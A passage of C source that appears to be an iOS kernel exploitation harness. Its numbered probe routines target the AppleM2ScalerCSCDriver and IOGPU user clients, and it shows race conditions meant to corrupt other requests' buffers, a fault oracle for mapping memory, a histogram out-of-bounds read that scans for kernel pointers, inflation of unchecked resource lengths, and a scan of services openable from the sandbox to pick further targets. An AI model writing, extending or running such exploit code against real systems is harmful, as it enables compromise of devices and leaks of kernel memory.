        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        uint64_t h = dst_checksum(dst);
        iter++;
        if (h != expect || k2 != 0) {
            LOG("[cr] iter %ld: kr 0x%08x checksum %016llx MISMATCH", iter, k2, h);
            corrupt++;
        }
        usleep(1000);
    }
    g_shot_stop = 1;
    pthread_join(th, NULL);
    LOG("[cr] %ld iters, %ld corrupted", iter, corrupt);
    LOG("[v31b] done (alive)");
}


// V32: read the driver's own DART-fault classification via GetDiag (sel 8)
// before/after kill-shot. trackDartError_gated classifies the fault DVA
// ("Dart Error req %d, %s plane %d", RegStream/NC/Spill) into log_activity.
static void p_diag_dart(void) {
    LOG("[v32] diag dart-error capture");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    size_t bufsz = 0x10000;
    uint8_t *before = must_map(bufsz), *after = must_map(bufsz);

    memset(before, 0, bufsz);
    *(uint32_t *)before = 0x6944506b;
    uint64_t va = (uint64_t)(uintptr_t)before;
    call_struct(8, &va, 8, NULL, NULL);

    killshot(si, di);
    usleep(200000);

    memset(after, 0, bufsz);
    *(uint32_t *)after = 0x6944506b;
    va = (uint64_t)(uintptr_t)after;
    call_struct(8, &va, 8, NULL, NULL);

    // diff: print records present in after but not before
    for (size_t i = 0; i + 16 <= bufsz; i += 8) {
        uint64_t a = *(uint64_t *)(after + i);
        uint64_t b = *(uint64_t *)(before + i);
        if (a != b) {
            LOG("[dd] +0x%04zx: %016llx -> %016llx", i, b, a);
        }
    }
    LOG("[v32] done (alive)");
}


// V33: fault-oracle memory mapping. bfW=0 disables X-axis validation;
// bfX (17-bit register write) positions the fill start. Sweep bfX/bfY:
// kr 0 = write landed in mapped memory; 0x2d6 = DART fault (unmapped).
static void p_oracle(void) {
    LOG("[v33] fault-oracle mapping");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);

    // coarse bfX sweep, bfY=16 bfW=0 bfH=32 (known kr 0 config)
    for (uint32_t bx = 0; bx <= 0x1ffc0; bx += 0x1000) {
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, si, di, bx, 16, 0, 32, 32, 32);
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        long first = -1;
        long bad = (kr == 0) ? scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first) : -1;
        LOG("[or] bfX 0x%05x -> kr 0x%08x changed %ld first 0x%lx", bx, kr, bad, first);
        usleep(50000);
    }
    // bfY sweep at bfX=0
    for (uint32_t by = 0; by <= 0x1ffc0; by += 0x800) {
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, si, di, 0, by, 0, 32, 32, 32);
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        long first = -1;
        long bad = (kr == 0) ? scan_range(dst, 0x22, 0, IOSurfaceGetAllocSize(dst), &first) : -1;
        LOG("[or] bfY 0x%05x -> kr 0x%08x changed %ld first 0x%lx", by, kr, bad, first);
        usleep(50000);
    }
    LOG("[v33] done (alive)");
}


// V34: fixed cross-request race. T2: valid DOWNSCALE 1024->64 (checksum-verified
// every iter). T1: kill-shot hammer on a separate connection. If T1's fill
// ever lands in T2's mapped buffers, T2's output changes.
static void *t_killhammer2(void *arg) {
    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
    if (!c) { LOG("[cr2] hammer open failed"); return NULL; }
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return NULL;
    uint8_t *req = must_map(0x1000);
    while (!g_shot_stop) {
        border_payload(req, IOSurfaceGetID(src), IOSurfaceGetID(dst),
                       32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        IOConnectCallMethod(c, 1, NULL, 0, req, 0x1b0, NULL, NULL, NULL, NULL);
        usleep(1000);
    }
    return NULL;
}
static void p_cross_race2(int seconds) {
    LOG("[v34] cross-request race v2 %ds", seconds);
    IOSurfaceRef srcBig = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(256, 256);
    if (!srcBig || !dst) { LOG("[cr2] surface fail"); return; }
    // fixed src pattern
    uint32_t seed = 0;
    IOSurfaceLock(srcBig, 0, &seed);
    uint8_t *b = IOSurfaceGetBaseAddress(srcBig);
    size_t tot = IOSurfaceGetBytesPerRow(srcBig) * 64;
    for (size_t i = 0; i < tot; i++) b[i] = (uint8_t)(i * 3 + 7);
    IOSurfaceUnlock(srcBig, 0, &seed);
    // working downscale: crop full 1024 src -> 64 dst
    craft_transform(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst), 64, 64);
    *(uint32_t *)(g_req + 0x68) = 256;             // dst rect 256 (4x upscale, known-good)
    *(uint32_t *)(g_req + 0x6c) = 256;
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(200000);
    uint64_t expect = dst_checksum(dst);
    LOG("[cr2] baseline kr 0x%08x expect %016llx", kr, expect);
    if (kr) { LOG("[cr2] baseline broken, abort"); return; }

    g_shot_stop = 0;
    pthread_t th;
    pthread_create(&th, NULL, t_killhammer2, NULL);
    long iter = 0, corrupt = 0;
    time_t t0 = time(NULL);
    while (time(NULL) - t0 < seconds) {
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst), 64, 64);
        *(uint32_t *)(g_req + 0x68) = 256;
        *(uint32_t *)(g_req + 0x6c) = 256;
        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        uint64_t h = dst_checksum(dst);
        iter++;
        if (h != expect || k2 != 0) {
            LOG("[cr2] iter %ld: kr 0x%08x checksum %016llx MISMATCH (expect %016llx)",
                iter, k2, h, expect);
            corrupt++;
        }
        usleep(500);
    }
    g_shot_stop = 1;
    pthread_join(th, NULL);
    LOG("[cr2] %ld iters, %ld corrupted", iter, corrupt);
    LOG("[v34] done (alive)");
}


// V35: SetCustomFilter path. sel 4 takes {6 x u32 != 0, u64 userspace VA of
// coeffs}. Framework constants: type<=7 -> a1=a4=(0x40000-(type<<15))>>3,
// a2=4, a3=0x10, a5=8, a6=0x10. Probe acceptance, then oversized dims hoping
// the kernel over-reads our coeff buffer into scaler math (measurable in dst).
static void p_filter(void) {
    LOG("[v35] SetCustomFilter probes");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    uint8_t *coef = must_map(0x10000);
    for (int i = 0; i < 0x10000; i++) coef[i] = (uint8_t)(i >> 4);

    // (a) framework-derived constants for each filter type
    for (uint32_t type = 0; type <= 7; type++) {
        struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } cf = {
            (0x40000 - (type << 15)) >> 3, 4, 0x10,
            (0x40000 - (type << 15)) >> 3, 8, 0x10,
            (uint64_t)(uintptr_t)coef };
        kern_return_t kr = call_struct(4, &cf, 0x20, NULL, NULL);
        LOG("[flt] type %u a1 %05x -> kr 0x%08x", type, cf.a1, kr);
    }
    // (b) small sanity set
    static const uint32_t combos[][6] = {
        {1,1,1,1,1,1}, {4,4,0x10,4,8,0x10}, {0x100,4,0x10,0x100,8,0x10},
        {0x7000,4,0x10,0x7000,8,0x10}, {0xffff,0xff,0xff,0xffff,0xff,0xff},
    };
    for (unsigned i = 0; i < sizeof(combos)/sizeof(combos[0]); i++) {
        struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } cf = {
            combos[i][0], combos[i][1], combos[i][2],
            combos[i][3], combos[i][4], combos[i][5],
            (uint64_t)(uintptr_t)coef };
        kern_return_t kr = call_struct(4, &cf, 0x20, NULL, NULL);
        LOG("[flt] combo %u {%x %x %x %x %x %x} -> kr 0x%08x", i,
            cf.a1, cf.a2, cf.a3, cf.a4, cf.a5, cf.a6, kr);
    }
    // (c) accepted config -> transform with CustomFilter flag (bit 6),
    // compare dst checksums across runs with different heap neighbors
    struct { uint32_t a1,a2,a3,a4,a5,a6; uint64_t va; } good = {
        0x7000, 4, 0x10, 0x7000, 8, 0x10, (uint64_t)(uintptr_t)coef };
    kern_return_t kset = call_struct(4, &good, 0x20, NULL, NULL);
    LOG("[flt] set for transform -> kr 0x%08x", kset);
    for (int i = 0; i < 4; i++) {
        surf_fill_alloc(dst, 0x22);
        craft_transform(g_req, si, di, 64, 64);
        *(uint64_t *)(g_req + 0x20) |= (1ULL << 6);   // CustomFilter
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(100000);
        LOG("[flt] transform+customfilter %d -> kr 0x%08x checksum %016llx",
            i, kr, dst_checksum(dst));
    }
    LOG("[v35] done (alive)");
}


// V36: histogram path. Transform with histogram options (bit 29, bin mode,
// region, pixel bins) may resize client+0x148 (GetHistogram copy length).
// Measure how much GetHistogram actually writes into a big 0xAA buffer and
// scan for kernel-pointer patterns (OOB-read infoleak).
static long hist_measure(uint8_t *buf, size_t bufsz, int scan_ptrs) {
    memset(buf, 0xAA, bufsz);
    *(uint32_t *)buf = 0;                        // no magic needed for sel 7
    uint64_t va = (uint64_t)(uintptr_t)buf;
    kern_return_t kr = call_struct(7, &va, 8, NULL, NULL);
    long written = 0;
    for (size_t i = 0; i < bufsz; i++) if (buf[i] != 0xAA) written++;
    LOG("[hg] GetHistogram -> kr 0x%08x, written(bytes != 0xAA) %ld", kr, written);
    if (scan_ptrs) {
        int found = 0;
        for (size_t i = 0; i + 8 <= bufsz && found < 16; i += 4) {
            uint64_t v = *(uint64_t *)(buf + i);
            if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff || (v >> 40) == 0xfffffd ||
                (v >> 40) == 0xfffff0) {
                LOG("[hg] ptr-like @+0x%zx: %016llx", i, v);
                found++;
            }
        }
        if (!found) LOG("[hg] no ptr-like qwords");
    }
    return written;
}
static void p_histogram(void) {
    LOG("[v36] histogram path probes");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) return;
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    size_t bufsz = 0x10000;
    uint8_t *hbuf = must_map(bufsz);

    LOG("[hg] baseline (no histogram transform):");
    hist_measure(hbuf, bufsz, 1);

    // transforms with histogram options, increasing ambition
    static const struct { uint32_t binmode, offx, offy, w, h; const char *n; } hc[] = {
        { 1, 0, 0, 64, 64, "binmode1-region64" },
        { 2, 0, 0, 64, 64, "binmode2-8bins" },
        { 1, 0, 0, 4096, 4096, "binmode1-region4096" },
        { 2, 0, 0, 0xffff, 0xffff, "binmode2-region64k" },
    };
    for (unsigned i = 0; i < sizeof(hc)/sizeof(hc[0]); i++) {
        craft_transform(g_req, si, di, 64, 64);
        *(uint64_t *)(g_req + 0x20) |= (1ULL << 29);       // HistogramBinMode present
        *(uint32_t *)(g_req + 0xdc) = hc[i].binmode;
        *(uint32_t *)(g_req + 0xe0) = hc[i].offx;
        *(uint32_t *)(g_req + 0xe4) = hc[i].offy;
        *(uint32_t *)(g_req + 0xe8) = hc[i].w;
        *(uint32_t *)(g_req + 0xec) = hc[i].h;
        for (int b = 0; b < 8; b++)
            *(uint32_t *)(g_req + 0xf0 + b * 4) = 0x100 * (b + 1);   // pixel bins
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[hg] transform %s -> kr 0x%08x", hc[i].n, kr);
        usleep(100000);
        hist_measure(hbuf, bufsz, 1);
    }
    LOG("[v36] done (alive)");
}


// V37: attack-surface scan — which IOService classes are openable from the
// app sandbox (no entitlements). Guides plan-B target selection.
static void p_surface_scan(void) {
    LOG("[v37] IOService open scan");
    static const char *names[] = {
        // new in 27.0 (kext diff)
        "VCPDRMService", "VCPDRMServiceUserClient", "AppleImage4", "Image4",
        "AppleEncryptedArchive", "AFKHIDTBDevice",
        // GPU / media / classic surfaces
        "IOGPU", "AGXDevice", "AGXDeviceUserClient", "IOGPUDevice",
        "AppleH16ANEInterface", "ANEDevice", "AppleANE", "NeuralEngine",
        "AppleAVD", "AppleAVE2", "AppleJPEGDriver", "AppleProRes",
        "AppleMobileFramebuffer", "IOMobileFramebufferAP", "AppleDisplayPipe",
        "AppleDPAF", "AppleDPDevice", "AppleCDM", "AppleFairPlayIOKit",
        "AppleCredentialManager", "AppleSEPManager", "AppleSSE",
        "IOAudio2Device", "AppleSPU", "AppleSMC", "ApplePMGR",
        "AppleNVMeController", "AppleEmbeddedNVMeController",
        "AppleUSBHostController", "AppleT8132USBXHCI",
        "AppleConvergedIPCDevice", "AFKSharedMemoryResource",
        "IOSurfaceRoot", "IOSurface", "AppleM2ScalerCSCDriver",
        "AppleM2ScalerParavirtDriver",
        "AppleH16CameraInterface", "AppleH13CamIn", "AppleCameraInterface",
        "AppleBaseband", "AppleBCMWLANCore", "AppleWiFi",
        "AppleS5L8960XUSBArbitrator", "AppleAuthCP", "AppleKeyStore",
        "AppleARMWatchdogTimer", "AppleSART", "ApplePMU",
        NULL
    };
    for (int i = 0; names[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(names[i]);
        if (!m) continue;
        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (!svc) { LOG("[sc] %-32s NOT FOUND", names[i]); continue; }
        for (uint32_t type = 0; type <= 3; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            if (!kr && c) {
                LOG("[sc] %-32s OPEN OK type %u conn 0x%x", names[i], type, c);
                IOServiceClose(c);
            } else if (type == 0) {
                LOG("[sc] %-32s exists, open -> 0x%08x", names[i], kr);
            }
        }
        IOObjectRelease(svc);
    }
    LOG("[v37] done");
}


// V38: generic userclient method-table prober for plan-B targets.
static void probe_client(const char *svc_name, uint32_t type) {
    io_connect_t c = open_service(svc_name, type);
    if (!c) { LOG("[mp] %s/%u: open failed", svc_name, type); return; }
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x2000);
    memset(in, 0, 0x2000);
    int live = 0;
    for (uint32_t sel = 0; sel < 40; sel++) {
        // scalar probe
        uint64_t sv[4] = {0,0,0,0}; uint32_t sc = 4;
        kern_return_t krs = IOConnectCallScalarMethod(c, sel, NULL, 0, sv, &sc);
        // struct probe: insz 0, outsz 0
        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
        size_t osz = 0;
        kern_return_t kr0 = IOConnectCallMethod(c, sel, NULL, 0, NULL, 0, osc, &nosc, NULL, &osz);
        // struct with data
        osz = 0x1000;
        memset(out, 0xAA, 0x2000);
        nosc = 0;
        kern_return_t kr1 = IOConnectCallMethod(c, sel, NULL, 0, in, 0x1000, osc, &nosc, out, &osz);
        if (krs != 0xe00002c7 || kr0 != 0xe00002c7 || kr1 != 0xe00002c7) {
            LOG("[mp] %s/%u sel %2u: scalar 0x%08x (cnt %u) | s00 0x%08x | s1000 0x%08x osz 0x%zx",
                svc_name, type, sel, krs, sc, kr0, kr1, osz);
            live++;
        }
        usleep(500);
    }
    LOG("[mp] %s/%u: %d live selectors", svc_name, type, live);
    IOServiceClose(c);
    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x2000);
    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x2000);
}
static void p_method_probe(void) {
    LOG("[v38] method-table probes");
    probe_client("AppleJPEGDriver", 0);
    probe_client("AppleJPEGDriver", 1);
    probe_client("IOMobileFramebufferAP", 0);
    probe_client("IOGPU", 1);
    probe_client("AppleKeyStore", 0);
    LOG("[v38] done");
}


// V39: IOGPU resource games (type-1 userclient).
// sel8 s_new_resource: type 0x80 client buffer. in+0x38 = va1 (drives
// res->len = va1 - base, UNCHECKED), in+0x48 = wired size. Inflate len.
// sel38/39 replace backing (single atomic copy per statics — verify gates).
static void p_iogpu(void) {
    LOG("[v39] IOGPU resource games");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) { LOG("[gpu] open failed"); return; }
    LOG("[gpu] conn 0x%x", c);
    uint8_t *in = must_map(0x1000);
    uint8_t *out = must_map(0x1000);
    uint8_t *buf1 = must_map(0x4000);
    uint8_t *buf2 = must_map(0x4000);
    memset(buf1, 0x11, 0x4000);
    memset(buf2, 0x22, 0x4000);

    // 1) size discovery for sel 8
    static const size_t inszs[] = { 0x58, 0x60, 0x68, 0x70, 0x80, 0x100, 0x200 };
    static const size_t outszs[] = { 0x58, 0x80, 0x100, 0x220, 0x400, 0x1000 };
    uint32_t rid = 0;
    kern_return_t kr = KERN_FAILURE;
    size_t osz = 0;
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    for (unsigned ii = 0; ii < sizeof(inszs)/sizeof(size_t) && !rid; ii++) {
        for (unsigned oi = 0; oi < sizeof(outszs)/sizeof(size_t) && !rid; oi++) {
            memset(in, 0, 0x1000); memset(out, 0, 0x1000);
            *(uint32_t *)(in + 0x00) = 0x80;
            *(uint32_t *)(in + 0x30) = 1;
            *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
            *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
            *(uint64_t *)(in + 0x48) = 0x4000;
            osz = outszs[oi]; nosc = 0;
            kr = IOConnectCallMethod(c, 8, NULL, 0, in, inszs[ii], osc, &nosc, out, &osz);
            LOG("[gpu] sel8 insz 0x%zx outsz 0x%zx -> kr 0x%08x", inszs[ii], outszs[oi], kr);
            if (kr == 0) rid = *(uint32_t *)(out + 0x24);
            usleep(10000);
        }
    }
    LOG("[gpu] sel8 normal -> kr 0x%08x rid %u", kr, rid);
    if (!rid) { LOG("[gpu] no resource, abort"); return; }

    // 2) inflated resource: va1 far beyond wired size
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x80;
    *(uint32_t *)(in + 0x30) = 1;
    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x100000; // len ~1MB
    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
    *(uint64_t *)(in + 0x48) = 0x4000;                               // wired 16KB
    osz = 0x58; nosc = 0;
    kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
    uint32_t rid2 = *(uint32_t *)(out + 0x24);
    LOG("[gpu] sel8 inflated -> kr 0x%08x rid %u (out+28 %llx)", kr, rid2,
        *(uint64_t *)(out + 0x28));
    // variant: out+0x28 reports rootLen — compare normal vs inflated
    LOG("[gpu] inflated out: %016llx %016llx %016llx",
        *(uint64_t *)(out + 0x00), *(uint64_t *)(out + 0x28), *(uint64_t *)(out + 0x30));

    // 3) replaceable-flag hunt: create with various +0x15/+0x16 bits, then sel38
    static const uint8_t f15[] = { 0, 8, 0 };   // +0x15
    static const uint8_t f16[] = { 1, 0, 6 };   // +0x16
    for (int v = 0; v < 3; v++) {
        memset(in, 0, 0x1000); memset(out, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = 0x80;
        *(uint32_t *)(in + 0x30) = 1;
        in[0x15] = f15[v]; in[0x16] = f16[v];
        *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
        *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
        *(uint64_t *)(in + 0x48) = 0x4000;
        osz = 0x58; nosc = 0;
        kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
        uint32_t r3 = *(uint32_t *)(out + 0x24);
        LOG("[gpu] sel8 f15 %02x f16 %02x -> kr 0x%08x rid %u", f15[v], f16[v], kr, r3);
        if (kr || !r3) continue;
        memset(in, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = r3;
        *(uint64_t *)(in + 0x08) = (uint64_t)(uintptr_t)buf2;
        *(uint64_t *)(in + 0x10) = 0x4000;
        nosc = 0;
        kern_return_t k38 = IOConnectCallMethod(c, 38, NULL, 0, in, 0x18, osc, &nosc, NULL, NULL);
        LOG("[gpu]   sel38 on rid %u -> kr 0x%08x", r3, k38);
    }

    // 4) replace_backing_ranges: one record {buf2, 0x4000}
    uint64_t *ranges = (uint64_t *)must_map(0x1000);
    ranges[0] = (uint64_t)(uintptr_t)buf2;
    ranges[1] = 0x4000;
    memset(in, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = rid;
    *(uint64_t *)(in + 0x08) = (uint64_t)(uintptr_t)ranges;
    *(uint64_t *)(in + 0x10) = 1;
    nosc = 0;
    kr = IOConnectCallMethod(c, 39, NULL, 0, in, 0x18, osc, &nosc, NULL, NULL);
    LOG("[gpu] sel39 replace_ranges -> kr 0x%08x", kr);

    // 5) consumers of inflated resource: ops by id (46..53), mapping ops 45
    for (uint32_t op = 46; op <= 53; op++) {
        uint64_t sc_in[2] = { rid2, 0 };
        nosc = 0;
        kr = IOConnectCallMethod(c, op, sc_in, 1, NULL, 0, osc, &nosc, NULL, NULL);
        if (kr != 0xe00002c7 && kr != 0xe00002c2)
            LOG("[gpu] op %u on inflated -> kr 0x%08x", op, kr);
    }
    // 6) command queue (sel 42 scIn=2 scOut=2) for later submit games
    uint64_t qin[2] = { 0, 0 };
    uint64_t qout[2] = { 0, 0 };
    uint32_t qoutc = 2;
    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qoutc);
    LOG("[gpu] sel42 new_queue -> kr 0x%08x out %llx %llx", kr, qout[0], qout[1]);
    LOG("[v39] done (alive)");
}


// V40: IOGPU VM map path. sel42 (VM obj) -> sel44 (attach memory) -> sel45
// (bind resource at GPU-VA offset, NO bound check in IOGPUFamily; final
// check is AGX-side). Sweep offsets; watch kr / panics.
static void p_iogpu_vm(void) {
    LOG("[v40] IOGPU VM map probes");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) { LOG("[vm] open failed"); return; }
    uint8_t *in = must_map(0x1000);
    uint8_t *out = must_map(0x1000);
    uint8_t *buf1 = must_map(0x4000);
    memset(buf1, 0x11, 0x4000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;

    // resource
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x80;
    *(uint32_t *)(in + 0x30) = 1;
    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
    *(uint64_t *)(in + 0x48) = 0x4000;
    size_t osz = 0x58;
    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
    uint32_t rid = *(uint32_t *)(out + 0x24);
    LOG("[vm] sel8 -> kr 0x%08x rid %u", kr, rid);

    // VM object
    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
    uint32_t qc = 2;
    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
    LOG("[vm] sel42 -> kr 0x%08x out {%llx, %llx}", kr, qout[0], qout[1]);
    uint64_t vmid = qout[0], vmtok = qout[1];

    // attach memory: try candidate second args
    static const char *cand_names[] = { "vmtok", "rid", "qid" };
    uint64_t cands[3] = { vmtok, rid, 0 };
    // also try queue id from sel6 (real command queue)
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x408, osc, &nosc, out, &osz);
    LOG("[vm] sel6 new_cmd_queue -> kr 0x%08x out {%llx, %llx}", kr,
        *(uint64_t *)out, *(uint64_t *)(out + 8));
    cands[2] = *(uint64_t *)out;

    int attached = 0;
    for (int i = 0; i < 3 && !attached; i++) {
        uint64_t a2[2] = { vmid, cands[i] };
        kr = IOConnectCallScalarMethod(c, 44, a2, 2, NULL, NULL);
        LOG("[vm] sel44 attach %s (%llx) -> kr 0x%08x", cand_names[i], cands[i], kr);
        if (kr == 0) attached = 1;
    }
    if (!attached) { LOG("[vm] no attach, abort"); return; }

    // sel45 bind at sweeping offsets
    static const uint64_t offs[] = { 0, 0x4000, 0x100000, 0x10000000, 0x100000000, 0x10000000000ULL };
    for (unsigned i = 0; i < sizeof(offs)/8; i++) {
        memset(in, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = 1;                    // count
        *(uint32_t *)(in + 0x08) = rid;                  // resourceId
        *(uint32_t *)(in + 0x0c) = 0;                    // index
        *(uint64_t *)(in + 0x10) = offs[i];              // offset
        *(uint8_t  *)(in + 0x18) = 0;                    // flag
        nosc = 0;
        kr = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
        LOG("[vm] sel45 bind off 0x%llx -> kr 0x%08x", offs[i], kr);
        usleep(50000);
    }
    LOG("[v40] done (alive)");
}


// V41: full VM path: sel14 (notification queue -> ns 0x90) -> sel44 attach ->
// sel45 bind at sweeping offsets. Plus IOConnectMapMemory64 type sweep.
static void p_iogpu_vm2(void) {
    LOG("[v41] IOGPU VM full path");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) { LOG("[vm2] open failed"); return; }
    uint8_t *in = must_map(0x1000);
    uint8_t *out = must_map(0x1000);
    uint8_t *buf1 = must_map(0x4000);
    memset(buf1, 0x11, 0x4000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;

    // resource
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x80;
    *(uint32_t *)(in + 0x30) = 1;
    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf1 + 0x4000;
    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf1;
    *(uint64_t *)(in + 0x48) = 0x4000;
    size_t osz = 0x58;
    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
    uint32_t rid = *(uint32_t *)(out + 0x24);
    LOG("[vm2] sel8 -> kr 0x%08x rid %u", kr, rid);

    // map memory type sweep
    for (uint32_t mt = 0; mt < 12; mt++) {
        mach_vm_address_t ma = 0; mach_vm_size_t msz = 0;
        kern_return_t km = IOConnectMapMemory64(c, mt, mach_task_self(), &ma, &msz, 0);
        if (!km) LOG("[vm2] MapMemory type %u -> addr %llx size %llx", mt, ma, msz);
    }

    // sel14: scIn=2 (type, index), stOut=0x10 (struct!) — id in out+8
    uint64_t nqid = 0;
    int nonzero = 0;
    for (uint64_t t = 1; t <= 0x2000 && !nqid; t++) {
        uint64_t a[2] = { t, 0 };
        memset(out, 0, 0x1000);
        size_t o16 = 0x10; nosc = 0;
        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &o16);
        if (kr == 0) { nqid = *(uint64_t *)(out + 8);
            LOG("[vm2] sel14 type %llu -> nq id %llu (out0 %llx)", t, nqid, *(uint64_t *)out); }
        else if (kr != 0xe00002c2 && kr != 0xe00002bd) {
            if (nonzero < 10) LOG("[vm2] sel14 type %llu -> kr 0x%08x", t, kr);
            nonzero++;
        }
    }
    LOG("[vm2] sel14 sweep done, unusual krs %d", nonzero);
    // VM
    uint64_t qin[2] = {0, 0}, qout[2] = {0, 0};
    uint32_t qc = 2;
    kr = IOConnectCallScalarMethod(c, 42, qin, 2, qout, &qc);
    uint64_t vmid = qout[0];
    LOG("[vm2] sel42 -> kr 0x%08x vmid %llu tok %llx", kr, vmid, qout[1]);
    if (!nqid || !vmid || !rid) { LOG("[vm2] missing pieces, abort"); return; }

    // attach
    uint64_t a44[2] = { vmid, nqid };
    kr = IOConnectCallScalarMethod(c, 44, a44, 2, NULL, NULL);
    LOG("[vm2] sel44 attach -> kr 0x%08x", kr);
    if (kr) { LOG("[vm2] attach failed, abort"); return; }

    // sel45 bind offset sweep
    static const uint64_t offs[] = { 0, 0x4000, 0x100000, 0x40000000, 0x100000000, 0x8000000000ULL };
    for (unsigned i = 0; i < sizeof(offs)/8; i++) {
        memset(in, 0, 0x1000);
        *(uint32_t *)(in + 0x00) = 1;
        *(uint32_t *)(in + 0x08) = rid;
        *(uint32_t *)(in + 0x0c) = 0;
        *(uint64_t *)(in + 0x10) = offs[i];
        *(uint8_t  *)(in + 0x18) = 0;
        nosc = 0;
        kr = IOConnectCallMethod(c, 45, NULL, 0, in, 0x20, osc, &nosc, NULL, NULL);
        LOG("[vm2] sel45 bind off 0x%llx -> kr 0x%08x", offs[i], kr);
        usleep(50000);
    }
    LOG("[v41] done (alive)");
}


// V42: find the AGX accelerator service on iOS + replicate Metal open
static void p_agx_scan(void) {
    LOG("[v42] AGX service scan");
    static const char *names[] = {
        "AGXAcceleratorG16P", "AGXAcceleratorG16", "AGXAccelerator",
        "AGXAcceleratorG15P", "AGXAcceleratorG16G", "AGXG16P",
        "AGXControl", "AGXDevice", "AGXService", "AppleAGXControl",
        NULL
    };
    for (int i = 0; names[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(names[i]);
        if (!m) continue;
        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (!svc) { LOG("[agx] %-24s NOT FOUND", names[i]); continue; }
        static const uint32_t types[] = { 0, 1, 0x100005, 5, 0x100001 };
        for (unsigned t = 0; t < sizeof(types)/4; t++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), types[t], &c);
            if (!kr && c) {
